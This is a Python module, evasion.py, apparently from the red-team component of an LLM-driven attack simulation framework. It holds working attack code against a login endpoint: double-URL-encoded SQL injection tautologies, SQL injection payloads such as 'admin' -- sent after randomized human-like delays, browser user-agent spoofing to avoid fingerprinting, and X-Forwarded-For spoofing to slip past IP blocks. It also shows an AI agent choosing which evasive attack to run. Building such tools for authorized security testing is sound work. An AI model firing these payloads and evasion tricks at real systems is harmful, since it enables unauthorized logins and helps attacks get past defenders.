"""
evasion.py — Encoding, timing, and header tricks to slip past naive defenses.

Embeds a real attack (SQLi login by default) inside evasive wrappers.
"""

from __future__ import annotations

import random
import time
from typing import Any, Dict
from urllib.parse import unquote

import httpx

from backend.state import AttackEvent, LLMDecision, SystemState

from . import exploit_helpers as eh

_CLIENT_TIMEOUT = httpx.Timeout(12.0)

# Encoded form of a classic tautology — we decode locally then POST JSON (KB009)
_DOUBLE_ENCODED_USER = "%2527%20OR%20%25271%2527%3D%25271"


def run(state: SystemState, llm_decision: LLMDecision) -> AttackEvent:
    """
    Routes by technique; unknown evasion labels fall through to exploit.run_generic.
    """
    technique = (llm_decision.get("technique") or "").lower()
    if technique == "sqli_double_encoded":
        return _run_double_encoded_sqli(state, llm_decision)
    if technique == "timing_mimic":
        return _run_timing_mimic(state, llm_decision)
    if technique == "ua_spoofing":
        return _run_ua_spoof(state, llm_decision)
    if technique == "header_injection":
        return _run_header_inject(state, llm_decision)

    from backend.agents.red.exploit import run_generic

    return run_generic(state, llm_decision)


def _run_double_encoded_sqli(state: SystemState, decision: LLMDecision) -> AttackEvent:
    """
    Applies up to 3x urllib unquote locally so the JSON body carries the real SQLi bytes (CWE-89).
    """
    _ = state
    pl = decision.get("payload") or {}
    raw = pl.get("username") or _DOUBLE_ENCODED_USER
    user = raw
    # Mirror server-side normalization: decode until stable
    for _ in range(3):
        nxt = unquote(user)
        if nxt == user:
            break
        user = nxt
    pw = pl.get("password", "")
    url = eh.target_url("/login")

    try:
        with httpx.Client(timeout=_CLIENT_TIMEOUT) as client:
            r = client.post(url, json={"username": user, "password": pw})
    except Exception as e:
        return _ev_fail("sqli_double_encoded", str(e))

    ok = r.status_code == 200
    return AttackEvent(
        type="sqli_double_encoded",
        target="/login",
        payload=f"decoded_len={len(user)}",
        result="success" if ok else "failed",
        evidence=f"HTTP {r.status_code} from_encoded={raw[:40]!r} → {r.text[:180]}",
        cwe="CWE-89",
        severity="critical",
        timestamp=time.time(),
    )


def _run_timing_mimic(state: SystemState, decision: LLMDecision) -> AttackEvent:
    """
    Lognormal delays between requests to mimic human jitter; then sends embedded attack.
    """
    _ = state
    # μ=0.8, σ=0.6 — irregular inter-arrival (spec)
    delay = random.lognormvariate(0.8, 0.6)
    time.sleep(min(delay, 5.0))

    pl = decision.get("payload") or {}
    user = pl.get("username", "admin' --")
    pw = pl.get("password", "")
    url = eh.target_url(decision.get("target_endpoint") or "/login")

    try:
        with httpx.Client(timeout=_CLIENT_TIMEOUT) as client:
            r = client.post(url, json={"username": user, "password": pw})
    except Exception as e:
        return _ev_fail("timing_mimic", str(e))

    return AttackEvent(
        type="timing_mimic",
        target="/login",
        payload=f"delay={delay:.2f}s",
        result="success" if r.status_code == 200 else "failed",
        evidence=f"HTTP {r.status_code} after human-like delay {r.text[:180]}",
        cwe="CWE-89",
        severity="medium",
        timestamp=time.time(),
    )


def _run_ua_spoof(state: SystemState, decision: LLMDecision) -> AttackEvent:
    """Uses a browser User-Agent instead of python-httpx default (fingerprint evasion)."""
    _ = state
    ua = (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    )
    pl = decision.get("payload") or {}
    body: Dict[str, Any] = {
        "username": pl.get("username", "admin' --"),
        "password": pl.get("password", ""),
    }
    url = eh.target_url(decision.get("target_endpoint") or "/login")

    try:
        with httpx.Client(
            timeout=_CLIENT_TIMEOUT,
            headers={"User-Agent": ua},
        ) as client:
            r = client.post(url, json=body)
    except Exception as e:
        return _ev_fail("ua_spoofing", str(e))

    return AttackEvent(
        type="ua_spoofing",
        target="/login",
        payload=ua[:60],
        result="success" if r.status_code == 200 else "failed",
        evidence=f"HTTP {r.status_code} {r.text[:200]}",
        cwe="CWE-89",
        severity="medium",
        timestamp=time.time(),
    )


def _run_header_inject(state: SystemState, decision: LLMDecision) -> AttackEvent:
    """
    X-Forwarded-For spoof — may bypass IP blocks if middleware trusts the header.
    """
    _ = state
    pl = decision.get("payload") or {}
    spoof_ip = pl.get("x_forwarded_for", "10.0.0.100")
    url = eh.target_url(decision.get("target_endpoint") or "/login")
    headers = {
        "X-Forwarded-For": str(spoof_ip),
        "X-Real-IP": str(spoof_ip),
    }

    try:
        with httpx.Client(timeout=_CLIENT_TIMEOUT, headers=headers) as client:
            r = client.post(
                url,
                json={
                    "username": pl.get("username", "admin' --"),
                    "password": pl.get("password", ""),
                },
            )
    except Exception as e:
        return _ev_fail("header_injection", str(e))

    return AttackEvent(
        type="header_injection",
        target="/login",
        payload=f"X-Forwarded-For={spoof_ip}",
        result="success" if r.status_code == 200 else "failed",
        evidence=f"HTTP {r.status_code} {r.text[:200]}",
        cwe="CWE-20",
        severity="medium",
        timestamp=time.time(),
    )


def _ev_fail(kind: str, err: str) -> AttackEvent:
    return AttackEvent(
        type=kind,
        target="/login",
        payload="",
        result="failed",
        evidence=err[:400],
        cwe="",
        severity="low",
        timestamp=time.time(),
    )
